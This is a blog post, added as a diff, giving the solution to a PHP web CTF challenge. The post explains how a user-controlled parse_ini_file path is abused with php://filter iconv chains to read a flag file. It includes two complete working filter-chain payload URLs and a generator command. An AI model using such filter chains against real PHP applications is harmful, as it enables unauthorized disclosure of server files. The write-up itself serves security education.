@@ -1,0 +1,103 @@
+---
+layout: post
+title:  "Poem CTF Solution, the PHP Filter Way"
+date:   2025-04-04 06:00:00 +0200
+categories: CTF DarkForge PHPFilter
+---
+
+# DarkForge Labs' First CTF
+
+First off, huge congratulations to everyone who completed the challenge — and a special shoutout to [et3rnos](https://x.com/et3rnos), the first to solve it and our official winner!
+
+This CTF was inspired by the article [*Impossible XXE in PHP*](https://swarm.ptsecurity.com/impossible-xxe-in-php/) by Aleksandr Zhurnakov. If you haven’t read it yet, you’re missing out.
+
+## The Challenge
+
+The challenge was hosted at [https://ctf.darkfor.ge](https://ctf.darkfor.ge/) with the source available on our [GitHub](https://github.com/darkforge-labs/ctf-poem-web).
+
+Digging into [`index.php`](https://github.com/darkforge-labs/ctf-poem-web/blob/main/index.php), we find three interesting things:
+
+- The file parses a user-controlled parameter using:  
+  `parse_ini_file($poem_file, true);`
+- The `$poem_file` variable is controllable via the `poem_file` GET parameter:  
+  `$poem_file = $_GET['poem_file'] ?? '/var/www/html/poem.ini';`
+- The INI key it looks for is `POEM`:  
+  `$config['POEM']`  
+  _(Note: INI keys are **case sensitive**.)_
+
+From the [`Dockerfile`](https://github.com/darkforge-labs/ctf-poem-web/blob/main/Dockerfile), we learn the flag is stored at `/var/secret/flag.txt`.
+
+## Solution
+
+Your first instinct might be to try this:  
+[https://ctf.darkfor.ge/?poem_file=/var/secret/flag.txt](https://ctf.darkfor.ge/?poem_file=/var/secret/flag.txt)
+
+But that won’t work. The flag file doesn’t contain INI-formatted content, and `parse_ini_file()` expects a valid format like:
+
+```ini
+POEM = FLAG_VALUE
+```
+
+So, the trick is to **prepend** the necessary INI key to the flag content.
+
+## Dead Ends
+
+If you’re familiar with the modern [wrapwrap](https://github.com/ambionics/wrapwrap) technique by [Charles Fol](https://x.com/cfreal_), you might try using that. However, due to server constraints on URL length, you’ll hit a "Requested URI Too Long" error.
+
+![URI too long error](/assets/images/6b62b65e86a4665f74c7ca862328fc1cc098ecda.png)
+
+## Filters to the Rescue
+
+It all starts with this legendary post by [Gynvael](https://x.com/gynvael) in 2018:  
+[Surprising CTF task solution using php://filter](https://gynvael.coldwind.pl/?id=671)
+
+Shortly after this post, [lolknop](https://x.com/loknop) took it further with a custom payload generator you can find in this [Gist](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d).
+
+This is perfect — we can use it to prepend the line `POEM = ` to the flag content, making it parsable by `parse_ini_file()`.
+
+But... there’s a slight snag. Both `POEM =` and its base64 form `UE9FTSA9` contain characters not supported by lolknop's script. The workaround? Use a **tab** and remove the space before the `=`:
+
+```
+\tPOEM=
+```
+
+Which base64-encodes to: `CVBPRU09` — a string with characters fully supported by the Gist tooling. Excellent.
+
+This allows us to build a monster filter chain like this:
+
+```
+php://filter/.../resource=/var/secret/flag.txt
+```
+
+*(Note: Click the link for the full URL)*
+
+[Payload link https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8...\|convert.base64-decode/resource=/var/secret/flag.txt](https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8.CSISO2022KR%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.ISO6937.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.1046.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.CP1133.IBM932%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.UTF16LE%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.UTF16.EUCTW%7cconvert.iconv.MAC.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.857.SHIFTJISX0213%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.UTF16LE%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.UTF16.EUCTW%7cconvert.iconv.CP1256.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.851.BIG5%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.base64-decode/resource=/var/secret/flag.txt)
+
+## Easier Payload Generation
+
+For a much cleaner experience, use the [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) by [Rémi Matasse](https://x.com/_remsio_) of Synacktiv. It already maps most ASCII character to their supported encodings.
+
+Just run:
+
+```bash
+python php_filter_chain_generator.py --chain 'POEM ='
+```
+
+Then replace `resource=` with your target file (`/var/secret/flag.txt`), and voilà, payload done.
+
+*(Note: Click the link for the full URL)*
+
+[https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv...\|convert.base64-encode\|...\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.base64-decode/resource=/var/secret/flag.txt](https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8.CSISO2022KR%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.CSIBM1161.UNICODE%7cconvert.iconv.ISO-IR-156.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.8859_3.UTF16%7cconvert.iconv.863.SHIFT_JISX0213%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.INIS.UTF16%7cconvert.iconv.CSIBM1133.IBM943%7cconvert.iconv.GBK.SJIS%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.L6.UNICODE%7cconvert.iconv.CP1282.ISO-IR-90%7cconvert.iconv.CSA_T500.L4%7cconvert.iconv.ISO_8859-2.ISO-IR-103%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.L5.UTF-32%7cconvert.iconv.ISO88594.GB13000%7cconvert.iconv.CP950.SHIFT_JISX0213%7cconvert.iconv.UHC.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.CSIBM1161.UNICODE%7cconvert.iconv.ISO-IR-156.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.IBM860.UTF16%7cconvert.iconv.ISO-IR-143.ISO2022CNEXT%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.INIS.UTF16%7cconvert.iconv.CSIBM1133.IBM943%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.base64-decode/resource=/var/secret/flag.txt)
+
+![Flag Retrieved](/assets/images/3cc56575fc80a023f712eadc961786902d7b0d89.png)
+
+For deeper understanding, I highly recommend reading their full post:  
+[*PHP Filters Chain: What is it and how to use it*](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
+
+You can also explore [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT) by [Wupco](https://github.com/wupco) for fuzzing and payload crafting.
+
+## Final Thoughts
+
+This challenge was all about exploring edge-case behavior in PHP’s obscure corners and the community’s creativity in weaponizing those quirks. The linked articles are truly mind-bending and absolutely worth a read.
+
+Big thanks to everyone who played, and stay tuned, the [DarkForge](https://darkforge.io) team has a lot more coming your way.
